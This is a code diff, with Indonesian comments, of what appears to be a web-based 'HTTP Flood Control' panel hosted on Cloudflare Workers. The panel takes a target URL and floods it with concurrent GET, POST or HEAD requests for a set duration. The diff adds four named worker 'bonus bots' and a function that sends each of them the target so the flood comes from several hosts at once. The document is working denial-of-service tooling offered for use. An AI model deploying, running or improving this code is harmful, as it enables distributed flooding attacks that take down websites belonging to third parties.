@@ -1,7 +1,14 @@
 /**
- * HTTP Flood Control v8
- * Setiap langkah wajib muncul di log biar kelihatan error-nya
+ * HTTP Flood Control v9
+ * Master andal + 4 bot bonus aktif lagi
  */
+
+const EXTRA_BOTS = [
+  'https://http-flood-control-1.aminaputra6.workers.dev',
+  'https://http-flood-control-2.aminaputra6.workers.dev',
+  'https://http-flood-control-3.aminaputra6.workers.dev',
+  'https://http-flood-control-4.aminaputra6.workers.dev'
+];
 
 const corsHeaders = {
   'Access-Control-Allow-Origin': '*',
@@ -44,15 +51,15 @@ input:focus,select:focus{outline:none;border-color:var(--accent)}
 <body>
 <div class="wrap"><div class="card">
 <h1>Master Flood Control</h1>
-<p class="sub">Serangan langsung dari Master. Log detail setiap langkah.</p>
+<p class="sub">Master + 4 bot bonus. Semua aktif.</p>
 
 <label>Target URL</label>
-<input type="url" id="target" placeholder="https://target.com" value="">
+<input type="url" id="target" placeholder="https://target.com">
 
 <div class="grid3">
 <div><label>Method</label><select id="method"><option>GET</option><option>POST</option><option selected>HEAD</option></select></div>
-<div><label>Concurrency</label><input type="number" id="conc" value="15" min="1" max="30"></div>
-<div><label>Durasi (detik)</label><input type="number" id="dur" value="12" min="3" max="60"></div>
+<div><label>Concurrency</label><input type="number" id="conc" value="12" min="1" max="25"></div>
+<div><label>Durasi (detik)</label><input type="number" id="dur" value="15" min="3" max="60"></div>
 </div>
 
 <div class="btns">
@@ -74,6 +81,7 @@ input:focus,select:focus{outline:none;border-color:var(--accent)}
 </div></div>
 
 <script>
+const EXTRA = ["https://http-flood-control-1.aminaputra6.workers.dev","https://http-flood-control-2.aminaputra6.workers.dev","https://http-flood-control-3.aminaputra6.workers.dev","https://http-flood-control-4.aminaputra6.workers.dev"];
 const $ = id => document.getElementById(id);
 let running = false;
 let liveN = 0;
@@ -108,6 +116,19 @@ async function oneAttack(target, method) {
   return r.status;
 }
 
+async function botAttack(botUrl, target, method) {
+  try {
+    const r = await fetch(botUrl.replace(/\/$/,'') + '/attack', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ url: target, method: method })
+    });
+    return r.status;
+  } catch {
+    return 0;
+  }
+}
+
 async function start() {
   log('Tombol ditekan...', 'warn');
 
@@ -118,9 +139,9 @@ async function start() {
   }
 
   const method = $('method').value;
-  let conc = parseInt($('conc').value) || 15;
-  let dur = parseInt($('dur').value) || 12;
-  conc = Math.max(1, Math.min(30, conc));
+  let conc = parseInt($('conc').value) || 12;
+  let dur = parseInt($('dur').value) || 15;
+  conc = Math.max(1, Math.min(25, conc));
   dur = Math.max(3, Math.min(60, dur));
 
   running = true;
@@ -139,19 +160,18 @@ async function start() {
   log('Method: ' + method + ' | Conc: ' + conc + ' | Durasi: ' + dur + 's', 'info');
   live('>> START', 'lok');
 
-  // Tes satu request dulu
-  log('Tes 1 request...', 'warn');
+  // Tes Master dulu
+  log('Tes Master...', 'warn');
   try {
     const st = await oneAttack(target, method);
-    log('Tes berhasil, status: ' + st, 'ok');
-    live('test → ' + st, 'lok');
+    log('Master OK, status: ' + st, 'ok');
+    live('master test → ' + st, 'lok');
     $('sSent').textContent = '1';
     if (st >= 200 && st < 500) $('sOk').textContent = '1';
     else $('sFail').textContent = '1';
   } catch (e) {
-    log('Tes GAGAL: ' + e.message, 'err');
-    live('test FAIL', 'lerr');
-    log('Worker /attack bermasalah. Coba redeploy.', 'err');
+    log('Master GAGAL: ' + e.message, 'err');
+    live('master FAIL', 'lerr');
     running = false;
     $('btnStart').disabled = false;
     $('btnStop').disabled = true;
@@ -163,10 +183,12 @@ async function start() {
   const end = t0 + dur * 1000;
   let sent = 1, ok = parseInt($('sOk').textContent) || 0, fail = parseInt($('sFail').textContent) || 0;
 
-  log('Mulai loop serangan...', 'info');
+  log('Loop serangan + 4 bot bonus...', 'info');
 
   while (running && Date.now() < end) {
     const promises = [];
+
+    // Master
     for (let i = 0; i < conc; i++) {
       promises.push(
         oneAttack(target, method).then(st => {
@@ -177,16 +199,31 @@ async function start() {
           $('sFail').textContent = fail;
           const el = (Date.now() - t0) / 1000;
           $('sRps').textContent = el > 0 ? Math.round(sent / el) : 0;
-          if (sent % 3 === 0) live('master → ' + st + ' | ' + sent, (st >= 200 && st < 500) ? 'lok' : 'lerr');
-        }).catch(e => {
-          sent++;
-          fail++;
+          if (sent % 4 === 0) live('master → ' + st + ' | ' + sent, (st >= 200 && st < 500) ? 'lok' : 'lerr');
+        }).catch(() => {
+          sent++; fail++;
           $('sSent').textContent = sent;
           $('sFail').textContent = fail;
-          if (sent % 3 === 0) live('master ERR | ' + sent, 'lerr');
         })
       );
     }
+
+    // 4 bot bonus (fire & forget, tidak ganggu Master)
+    EXTRA.forEach((bot, idx) => {
+      promises.push(
+        botAttack(bot, target, method).then(st => {
+          if (st > 0) {
+            sent++;
+            if (st >= 200 && st < 500) ok++; else fail++;
+            $('sSent').textContent = sent;
+            $('sOk').textContent = ok;
+            $('sFail').textContent = fail;
+            if (sent % 5 === 0) live('bot' + (idx+1) + ' → ' + st + ' | ' + sent, (st >= 200 && st < 500) ? 'lok' : 'lerr');
+          }
+        }).catch(() => {})
+      );
+    });
+
     await Promise.all(promises);
   }
 
@@ -217,7 +254,7 @@ $('btnStop').onclick = () => {
   log('Dihentikan manual', 'warn');
 };
 
-log('UI siap. Masukkan target lalu tekan Mulai.', 'info');
+log('UI siap. Master + 4 bot bonus aktif.', 'info');
 </script>
 </body>
 </html>`;
